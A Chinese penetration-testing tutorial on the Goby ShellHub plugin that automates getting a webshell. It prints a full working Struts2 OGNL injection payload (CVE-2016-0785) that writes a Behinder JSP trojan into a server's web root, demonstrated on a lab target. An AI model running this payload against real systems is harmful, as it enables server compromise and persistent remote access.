前言： 渗透测试过程中发现存在文件上传漏洞时，我们往往会尝试通过上传木马文件获取一个 webshell。上传的木马文件通常需要一个客户端例如冰蝎和蚁剑进行
shell 的获取及管理，在这一过程中用户需要打开管理工具并填写连接信息如上传文件的 url、连接密码等。然而，Goby 中 ShellHub
的出现可以使这个过程一键优雅的实现，只需点击 webshell 键即可弹出 webshell 控制窗口。

## 0×01 插件安装

ShellHub 已支持在 Goby 最新版插件扩展模块中一键下载安装。

![](https://image.3001.net/images/20211209/1639040499_61b1c5f30d665b9d3769b.png!small)

下载完 ShellHub 插件后即可在 PoC 页面定义相关的漏洞一键 webshell。

## 0×02 插件使用

本次选取 cve_2016_0785-Strtus2 远程代码执行漏洞获取 webshell 作为 PoC 演示。  
1.在漏洞模块新建 PoC, 填写名称匹配规则和描述等基本信息：

![](https://image.3001.net/images/20211209/1639040533_61b1c615f1becd7e5c7f0.png!small)

2.在漏洞扫描检测页面设置 HTTP 请求方法为 POST。

![](https://image.3001.net/images/20211209/1639040545_61b1c621f38ff6f8faa6f.png!small)  
在 Content-Type 字段中填入本次漏洞利用的 payload，在漏洞测试环节中 name 和 file 变量暂时用不上。

payload：

    
    
    %{(#nike='multipart/form-data').
    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?
    (#_memberAccess=#dm):
    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).
    (#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).
    (#req=(@org.apache.struts2.ServletActionContext@getRequest())).
    (#path1=#req.getRealPath('/')).(#sb=(new java.lang.StringBuilder(#path1))).
    (#path=#sb.append('/{{{name}}}')).(#shell='{{{file}}}').(#file=new java.io.File(#path)).(#fw=new java.io.FileWriter(#file)).(#fw.write(#shell)).
    (#fw.flush()).(#fw.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getWriter())).
    (#ros.print('UPLO')).(#ros.println('AD-OK')).(#ros.flush())}

3.在 Payload 中实现一个功能:打印出 UPLOAD-OK 字符串,作为漏洞是否利用成功的依据。

4.在攻击测试页面中定义 3 个变量，其中前两个变量 name（为随机生成的 8 位冰蝎马前缀 +.jsp 后缀构成冰蝎马相对路径），file
变量表示写入的木马文件内容。payload用上面测试的即可，上述变量会被引用至 payload 中。

变量详情：

name|rand|str|8

//生成8位随机字符

name|name|concat|.jsp

//前面生成的字符加上后缀构成木马相对路径

file|genshell|exp|B:jsp

// file 代表变量名，可随意指定，该变量实际是一个数组，在http请求头中或请求体时，其值为一个形如<?php echo
md5(随机值);unlink(__FILE__);?>; exp 代表上传一个 webshell；B:jsp 代表生成冰蝎的 jsp 马,同理还有
G:jspRaw 代表哥斯拉的 raw 类型的 jsp 马

![](https://image.3001.net/images/20211209/1639040595_61b1c6531fab12b525db8.png!small)5.设置漏洞利用成功标识-响应包中含有 UPLOAD-OK 字符串，设置 EXP 返回信息，包含：webshell 地址，webshell 连接密码，webshell 连接工具即可。

6.在 vulfocus.fofa.so 页面下快速启动一个用来测试的漏洞环境。

![](https://image.3001.net/images/20211209/1639040605_61b1c65df1e8d81b27a21.png!small)

![](https://image.3001.net/images/20211209/1639040619_61b1c66b291bc8708c1f0.png!small)

将存在漏洞的 url
导入，进行漏洞扫描和利用测试。![](https://image.3001.net/images/20211209/1639040631_61b1c6771d8902fe576dc.png!small)

扫描验证成功后点击 webshell 即可一键获取
webshell。![](https://image.3001.net/images/20211209/1639040644_61b1c684837263c853fe3.png!small)

![](https://image.3001.net/images/20211209/1639040881_61b1c7715b66e586cf103.png!small)

## 0×03 插件亮点

1.该 Goby 插件在对同一种类型漏洞获取 webshell 的利用方式 PoC 进行定义后，即可实现发现漏洞后一键
webshell。整个过程行云流水，将发现漏洞 -> 文件上传写入木马 -> 连接 webshell
客户端一系列流程进行融合简化为一键式操作。将渗透测试获取 webshell 的流程在 Goby 一款工具上进行打通，大大提高了漏洞发现和利用的效率。

2.支持自定义各类获取 webshell 的 PoC, PoC 编写浅显易懂大部分 payload 取自手动测试时所用的 payload
并再此基础上进行修改最终实现想要的功能。例如在代码执行的漏洞中利用代码执行写入 jsp 木马文件，PoC 一次编写可供多次使用。

PoC 中检测漏洞利用是否成功的方式也很简单。例如判断响应包中是否存在唯一标识符等，也可以增加多个测试来保证漏洞的可靠性。笔者本次只校验了返回包中是否存在
UPLOAD-OK
字符串来判断漏洞是否利用成功。![](https://image.3001.net/images/20211209/1639040899_61b1c78373eaefdfba047.png!small)

![](https://image.3001.net/images/20211209/1639040913_61b1c79157d64d540b0ae.png!small)  
3.支持多语言木马的上传。支持包括 JSPX、JSP、PHP、ASPX、ASP 冰蝎马的写入和一键实现获取 webshell, 语言覆盖面广。

4.目前该插件目前支持基本信息、文件管理、虚拟终端三大模块的 webShell
功能点，功能模块简洁明了。![](https://image.3001.net/images/20211209/1639040923_61b1c79bb0c6722d82f0d.png!small)

![](https://image.3001.net/images/20211209/1639040931_61b1c7a31c92551e5d8a1.png!small)

## 0×04 插件不足

1.目前只支持冰蝎的木马，期待蚁剑、哥斯拉木马的支持。使得用户在木马的使用上多几种选择。

2.webshell 支持的功能点可以扩充多一点，增加常用的功能模块如可以考虑集成常用命令，渗透工具等。

3.可以考虑附带常见用来获取 webShell 的 PoC，提升使用者使用效率等。

> 文章来自Goby社区成员：mybad，转载请注明出处。  
> 下载Goby内测版，请关注公众号：Gobysec  
> 下载Goby正式版，请访问官网：[http://gobies.org﻿](http://gobies.org)

